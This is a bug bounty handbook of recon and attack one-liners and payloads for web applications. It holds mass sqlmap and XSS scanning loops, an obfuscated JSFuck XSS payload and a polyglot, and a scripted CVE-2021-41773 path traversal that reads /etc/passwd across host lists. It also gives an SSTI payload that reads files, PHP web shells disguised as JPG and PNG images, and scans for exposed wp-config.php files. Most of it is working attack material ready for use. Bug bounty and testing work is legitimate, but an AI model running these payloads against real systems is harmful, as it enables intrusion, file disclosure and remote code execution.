# Bug Bounty Handbook

- [Resources](#resources)

## Table of Contents

- [Automated Subdomain Monitoring](#automated-subdomain-monitoring)
- [Burp Suite Extensions](#burp-suite-extensions)
- [JavaScript](#javascript)
- [Enumerate Subdomains, Web Servers and API Endpoints](#enumerate-subdomains-web-servers-and-api-endpoints)
- [Find CNAME Records](#find-cname-records)
- [Find hidden Parameters in JavaScript Files](#find-hidden-parameters-in-javascript-files)
- [Find JavaScript Files with gau and httpx](#find-javascript-files-with-gau-and-httpx)
- [Find Open Redirects](#find-open-redirects)
- [Find Secrets in JavaScript Files](#find-secrets-in-javascript-files)
- [Find SQL-Injection (SQLi) at Scale](#find-sql-injection-sqli-at-scale)
- [Find basic SQL-Injection (SQLi), Cross-Site Scripting (XSS) and Server-Side Template Injection (SSTI) Vulnerabilities with Magic Payload](#find-basic-sql-injection-sqli-cross-site-scripting-xss-and-server-side-template-injection-ssti-vulnerabilities-with-magic-payload)
- [Find Cross-Site Scripting (XSS) at Scale](#find-cross-site-scripting-xss-at-scale)
- [Fingerprinting with Shodan and Nuclei](#fingerprinting-with-shodan-and-nuclei)
- [Path Traversal Zero-Day in Apache HTTP Server (CVE-2021-41773)](#path-traversal-zero-day-in-apache-http-server-cve-2021-41773)
- [Server-Side Template Injection (SSTI) at Scale](#server-side-template-injection-ssti-at-scale)
- [Wayback Machine](#wayback-machine)
- [Web Shell / Malicious Images](#web-shell-malicious-images)
- [Wordpress Configuration Disclosure](#wordpress-configuration-disclosure)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Bug Crowd | Bug Bounty Platform | https://www.bugcrowd.com |
| CrowdStream | CrowdStream is a showcase of accepted and disclosed submissions on participating programs. | https://bugcrowd.com/crowdstream?filter=disclosures |
| disclose.io | We're here to make vulnerability disclosure safe, simple, and standardized for everyone. | https://disclose.io |
| HackerOne | Bug Bounty Platform | https://www.hackerone.com |
| Hacktivity | See the latest hacker activity on HackerOne | https://hackerone.com/hacktivity |
| InfoSecHub | n/a | https://linksshare.io |
| Intigriti | Bug Bounty Platform | https://www.intigriti.com |

## Automated Subdomain Monitoring

> https://github.com/hakluke/haktrails

> https://github.com/tomnomnom/anew

> https://github.com/projectdiscovery/notify

### Installation

```c
$ go install -v github.com/hakluke/haktrails@latest
$ go install -v github.com/tomnomnom/anew@latest
$ go install -v github.com/projectdiscovery/notify/cmd/notify@latest
```

### Configuration

#### haktrails

```c
$ vi ~/.config/haktools/haktrails-config.yml
```

```c
securitytrails:
  key: <API_KEY>
```

#### Notify

```c
$ vi ~/.config/notify/provider-config.yaml
```

```c
slack:
  - id: "slack"
    slack_channel: "recon"
    slack_username: "test"
    slack_format: "{{data}}"
    slack_webhook_url: "https://hooks.slack.com/services/XXXXXX"

  - id: "vulns"
    slack_channel: "vulns"
    slack_username: "test"
    slack_format: "{{data}}"
    slack_webhook_url: "https://hooks.slack.com/services/XXXXXX"

discord:
  - id: "crawl"
    discord_channel: "crawl"
    discord_username: "test"
    discord_format: "{{data}}"
    discord_webhook_url: "https://discord.com/api/webhooks/XXXXXXXX"

  - id: "subs"
    discord_channel: "subs"
    discord_username: "test"
    discord_format: "{{data}}"
    discord_webhook_url: "https://discord.com/api/webhooks/XXXXXXXX"

telegram:
  - id: "tel"
    telegram_api_key: "XXXXXXXXXXXX"
    telegram_chat_id: "XXXXXXXX"
    telegram_format: "{{data}}"
    telegram_parsemode: "Markdown" # None/Markdown/MarkdownV2/HTML (https://core.telegram.org/bots/api#formatting-options)

pushover:
  - id: "push"
    pushover_user_key: "XXXX"
    pushover_api_token: "YYYY"
    pushover_format: "{{data}}"
    pushover_devices:
      - "iphone"

smtp:
  - id: email
    smtp_server: mail.example.com
    smtp_username: test@example.com
    smtp_password: password
    from_address: from@email.com
    smtp_cc:
      - to@email.com
    smtp_format: "{{data}}"
    subject: "Email subject"
    smtp_html: false
    smtp_disable_starttls: false

googlechat:
  - id: "gc"
    key: "XXXXXXXX"
    token: "XXXXXX"
    space: "XXXXXX"
    google_chat_format: "{{data}}"

teams:
  - id: "recon"
    teams_webhook_url: "https://<domain>.webhook.office.com/webhookb2/xx@xx/IncomingWebhook/xx"
    teams_format: "{{data}}"

custom:
  - id: webhook
    custom_webhook_url: http://host/api/webhook
    custom_method: GET
    custom_format: '{{data}}'
    custom_headers:
      Content-Type: application/json
      X-Api-Key: XXXXX
      
custom:
  - id: webhookJson
    custom_webhook_url: http://host/api/webhook
    custom_method: GET
    custom_format: '{"text":{{dataJsonString}} }'
    custom_headers:
      Content-Type: application/json
      X-Api-Key: XXXXX

custom:
  - id: webhook
    custom_webhook_url: http://host/api/webhook
    custom_method: GET
    custom_sprig: '{"text":"{{ .url }}"}'
    custom_headers:
      Content-Type: application/json
      X-Api-Key: XXXXX
```

### Monitoring Oneliner

```c
$ while :; do echo <DOMAIN> | haktrails subdomain | anew subdomains.txt; sleep 86400; done | notify
```

## Burp Suite Extensions

* JS Link Finder
* Upload Scanner
* Turbo Intruder
* HTTP Request Smuggler
* Auth Analyzer

## JavaScript

### JSFuck

> http://www.jsfuck.com/

> https://github.com/aemkei/jsfuck

> https://github.com/aemkei/jsfuck/blob/master/jsfuck.js

```c
![]                                          // false
!![]                                         // true
[][[]]                                       // undefined
+[![]]                                       // NaN
+[]                                          // 0
+!+[]                                        // 1
!+[]+!+[]                                    // 2
[]                                           // Array
+[]                                          // Number
[]+[]                                        // String
![]                                          // Boolean
[]["filter"]                                 // Function
[]["filter"]["constructor"]( <CODE> )()      // eval
[]["filter"]["constructor"]("<FOOBAR>")()    // window
```

#### Encoded Payload

```c
<img src onerror="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]) [+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]++[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]">
```

## Enumerate Subdomains, Web Servers and API Endpoints

```c
$ subfinder -d <DOMAIN> -silent | /home/<USERNAME>/go/bin/httpx -silent -o <DOMAIN>_httpx.txt; for i in $(cat <DOMAIN>_httpx.txt); do DOMAIN=$(echo $i | /home/<USERNAME>/go/bin/unfurl format %d); ffuf -u $i/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt -o ${DOMAIN}_ffuf.txt; done
```

## Find CNAME Records

```c
$ for ip in $(cat <FILE>.txt); do dig asxf %ip | grep CNAME; done
```

## Find hidden Parameters in JavaScript Files

```c
$ assetfinder <DOMAIN> | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```

## Find JavaScript Files with gau and httpx

```c
$ echo http://<DOMAIN> | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
```

## Find Open Redirects

```c
$ echo "http://<RHOST>" | gau | grep =http | php -r "echo urldecode(file_get_contents('php://stdin'));"
```

## Find Secrets in JavaScript Files

```c
$ subfinder -d <DOMAIN> -silent | /home/<USERNAME>/go/bin/httpx -silent -o <DOMAIN>_httpx.txt; for i in $(cat <DOMAIN>_httpx.txt); do DOMAIN=$(echo $i | /home/<USERNAME>/go/bin/unfurl format %d) | cat <DOMAIN>_httpx.txt | nuclei -t /home/<USERNAME>/opt/03_web_application_analysis/nuclei-templates/exposures/tokens -o token-expose.txt; done
```

## Find SQL-Injection (SQLi) at Scale

```c
$ subfinder -d <DOMAIN> -silent -all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg,ico,woff,gif | tee -a <FILE>
$ cat <FILE> | gf sqli | tee -a <FILE>
$ while read line; do sqlmap -u $line --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3; done < <FILE>
```

## Find basic SQL-Injection (SQLi), Cross-Site Scripting (XSS) and Server-Side Template Injection (SSTI) Vulnerabilities with Magic Payload

```c
'"><svg/onload=alert()>{{7*7}}
```

## Find Cross-Site Scripting (XSS) at Scale

### XSStrike

> https://github.com/s0md3v/XSStrike

> https://github.com/lc/gau

> https://github.com/projectdiscovery/katana

```c
$ echo <DOMAIN> | gau | while read url; do python3 xsstrike.py -u $url --crawl -l 4 -d 5; done
$ echo <DOMAIN> | katana | while read url; do python3 xsstrike.py -u $url --crawl -l 4; done
```

```c
$ subfinder -d <DOMAIN> -all -silent | httpx -silent | katana -silent | Gxss -c 100 | dalfox pipe --skip-bav --skip-mining-all --skip-grepping
```

## Fingerprinting with Shodan and Nuclei

```c
$ shodan domain <DOMAIN> | awk '{print $3}' | httpx -silent | nuclei -t /PATH/TO/TEMPLATES/nuclei-templates/
```

## Path Traversal Zero-Day in Apache HTTP Server (CVE-2021-41773)

```c
$ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
```

## Server-Side Template Injection (SSTI) at Scale

```c
$ echo "<DOMAIN>" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/hostname').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
```

## Wayback Machine

### Password Search

1. Access https://web.archive.org/
2. Type in the desired domain
3. Switch to the URL tab https://web.archive.org/web/*/https://<DOMAIN>*
4. Apply the filter `%40`

## Web Shell / Malicious Images

```c
$ echo -n -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]);?>.' > <FILE>.jpg
$ echo -n -e '\x89\x50\x4E\x47<?php system($_GET["cmd"]);?>.' > <FILE>.png
```

## Wordpress Configuration Disclosure

```c
$ subfinder -silent -d http://<DOMAIN> | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60
```

## Cross-Site Scripting (XSS)

### Ployglot Payload

Note that `HTML tags` that need to be closed for `XSS`.

```c
<!--
<title>
<textarea>
<style>
<noscript>
<xmp>
<template>
<noembed>
```

```c
--></title></textarea></style></noscript></script></xmp></template></noembed><svg/onload=alert()>
```
